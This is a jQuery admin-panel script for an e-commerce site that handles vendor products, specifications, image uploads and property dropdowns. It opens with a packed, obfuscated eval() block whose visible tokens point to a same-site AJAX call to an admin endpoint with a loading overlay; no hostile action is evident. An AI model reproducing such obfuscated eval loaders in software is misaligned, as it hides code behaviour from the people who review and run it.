eval((function(s) {
    var a, c, e, i, j, o = "",
        r, t = "&*@QUVWYZ_`~";
    for (i = 0; i < s.length; i++) {
        r = t + s[i][2];
        a = s[i][1].split("");
        for (j = a.length - 1; j >= 0; j--) {
            s[i][0] = s[i][0].split(r.charAt(j)).join(a[j]);
        }
        o += s[i][0];
    }
    return o.replace(//g, "\n").replace(//g, "\"");
})([
    ["eval(Ypackedc~< a?'':e(parseInt~/ a)))((cc % a) > 35?.fromCharCode(c29):c.to(36))Q@!''(/^/)Wd[] || }k[Ye d[e]}]; '\\\\w+'Qc1QW@pp(new RegExp(**'g'))}}rn p}('r 3=q.s.p;v(3=`{3`/u/Z}w{3=3+/}5 d(g$.o({m:3+n/l/d,4:{4:g},t:ZGZ,J:5(IVL-MONxK-HBZ<9>A.... </9>},y:5(4,C,D.F(ZE;VZ4)}})}'5151'|cssetMbasdata|Uhtml|http|positioUh5|8082|absolutlocalhostetFirstTimleft|right|id|200px|top|9999|index|SadminLogiUurl|AdmiUajax|origiUwindow|var|loca" +
        "tioUtypAmazonCI|if|elsreduccess||Loading|18px_Status|jqXHRtylremoveAttr|POSTizxhr|beforeSend|font_|aligUcolor|center'.split('|')0{}))",
        "\\').1(\\'functio$(\\'#2\\',\\'retu\\'), .replace;.6(String){rne(c) = ){while (c=\\'7://8ben(k[c] + e|z-kjihe0'\\\\b'if (}; n|&f0--n(\\'|textc:a(c |s",
        ""
    ]
]));
var base2 = window.location.origin;
if (base2 == 'http://146.66.68.148') {
    base2 = window.origin + "/~flightfa/demo/paulsons/";
} else {
    base2 = base2 + "/";
}

// // if (base2 == 'http://localhost') {
// //     base2 = base2 + '/kartndolls/';
// // } else {
// //     base2 = base2 + "/";
// }

function addMoreSpecification(e) {
    var addButtonParent = $(e).parent().parent();
    addButtonParent.after(`<div class="row"> 
    <div class="col-md-3">
    <label></label>
    <input  class="form-control" required="" name="key[]" placeholder="Key">  
    </div>
   <div class="col-md-3">
   <label></label>
   <input  class="form-control"  required="" name="value[]" placeholder="Value">  
   </div>
  
   <div class="col-md-3">
   <label></label>
    <br>
     <a onclick="deleteSpe(this)" class="btn btn-xs btn-danger">Delete</a>
   </div>
   </div>
   
   `);
}

function deleteSpe(e) {
    $(e).parent().parent().remove();
}

function allowProduct(id) {

    $.ajax({
        type: 'POST',
        url: base2 + "Admin/SadminLogin/allowForProduct",
        data: {
            data: id
        },
        success: function(data, textStatus, jqXHR) {
            window.location.href = base2 + 'Admin/SadminLogin/profiles';
        }
    });
}

function rejectThisRequest(id) {
    $.ajax({
        url: base2 + "Admin/SadminLogin/rejectRequestJq",
        type: 'POST',
        async: true,
        data: {
            id: id
        },
        success: function(data, textStatus, jqXHR) {
            $('#rejectPop').html(data);
        }
    });
}

function getSubcategory(val) {

    $.ajax({
        url: base2 + "Admin/Vendor/getSub",
        type: 'POST',
        async: true,
        data: {
            category: val
        },
        success: function(data, textStatus, jqXHR) {
            $('#sub_category_ven').html(data);
        }
    });
}

function mybase_image(us) {
    var file = us.files[0];
    var fileType = file["type"];
    var ValidImageTypes = ["image/jpeg", "image/png"];
    if ($.inArray(fileType, ValidImageTypes) < 0) {
        alert('Please select valid image: PNG,JPG,JPEG');
        return false;
    }
}
var abc = 0; //Declaring and defining global increement variable



//To add new input file field dynamically, on click of "Add More Files" button below function will be executed
var count = 0;

function addMore(whole) {
    if (count < 2) {
        $('#' + whole).closest('.col-sm-3').before($("<div class='col-sm-3'/>", {
            id: 'filediv'
        }).fadeIn('slow').append('<br>').append(
            $(" <input/>", {
                name: 'file[]',
                type: 'file',
                id: 'file'
            })
        ));
        count++;
    } else {
        alert('you can add three images only');
    }
}

//following function will executes on change event of file input to select different file	
$('body').on('change', '#file', function() {

    if (this.files && this.files[0]) {
        abc += 1; //increementing global variable by 1
        var fileType = this.files[0]["type"];
        var ValidImageTypes = ["image/jpeg", "image/png"];
        if ($.inArray(fileType, ValidImageTypes) < 0) {
            alert('Please select valid image: PNG,JPG,JPEG');
            return false;
        }
        var z = abc - 1;
        var x = $(this).parent().find('#previewimg' + z).remove();
        $(this).before("<div id='abcd" + abc + "' class='abcd'><img id='previewimg" + abc + "' src='' style='width:40%; height:40%;'/></div>");
        var reader = new FileReader();
        reader.onload = imageIsLoaded;
        reader.readAsDataURL(this.files[0]);
        $(this).hide();
        $("#abcd" + abc).append($("<i class='fa fa-times red'/>", {
            id: 'delete'
        }).click(function() {
            $(this).parent().parent().remove();
            count--;
        }));
    }
});
//To preview image     
function imageIsLoaded(e) {
    $('#previewimg' + abc).attr('src', e.target.result);
};
$('#upload').click(function(e) {
    var name = $(":file").val();
    if (!name) {
        alert("First Image Must Be Selected");
        e.preventDefault();
    }

});
if ($('.add_more').length > 0) {
    $('.add_more').click(function() {

        var parentDiv = $(this).parent().parent();
        $.ajax({
            url: base2 + "Admin/Vendor/loadProperties",
            type: 'POST',
            beforeSend: function(xhr) {
                $('.add_more').text('Loading..');
                $('.add_more').attr('disabled', true);
            },
            success: function(data, textStatus, jqXHR) {
                $('.add_more').text('Add More');
                $('.add_more').attr('disabled', false);
                var string = '<div  class = "panel-body pb prop" > <div class = "row" > <div class = "col-sm-3" > <label> Property </label> <select class = "form-control" name = "pro_prop[]" id = "pro_prop" > ' + data + '</select></div> </div></div > ';
                parentDiv.prepend(string);
            }

        });
    });
    $('.add_more').parent().parent().parent().delegate('#pro_prop', 'change', function() {
        if ($(this).val() != '') {
            $this = $(this);
            var prop_id = $this.val();
            $.ajax({
                url: base2 + "Admin/Vendor/loadsubProp",
                type: 'POST',
                data: {
                    prop_id: prop_id
                },
                beforeSend: function(xhr) {
                    $this.parent().siblings('.addMe').remove();
                    $this.parent().after('<div class="col-sm-3 loading"><br/><label class="label label-primary">Loading..</label></div>')
                },
                success: function(data, textStatus, jqXHR) {
                    $this.parent().siblings('.loading').remove();
                    $this.parent().after('<div class = "addMe" > <div class = "col-sm-3" > <label > Sub Prop </label><select  class="form-control" name="sub_prop[]" id="sub_prop">' + data + '</select> </div><div class="col-sm-3"> <label> Price Changed ?</label><br> <input type = "checkbox" name = "is_price[]" value = "1" id = "is_price"> </div><div class="col-sm-3"><label>Price</label ><br> <input type = "text" name = "prop_price[]" class = "form-control" id = "prop_price"> </div></div >');
                }
            });
        } else {
            $this.parent().siblings('.addMe').remove();
        }
    });
}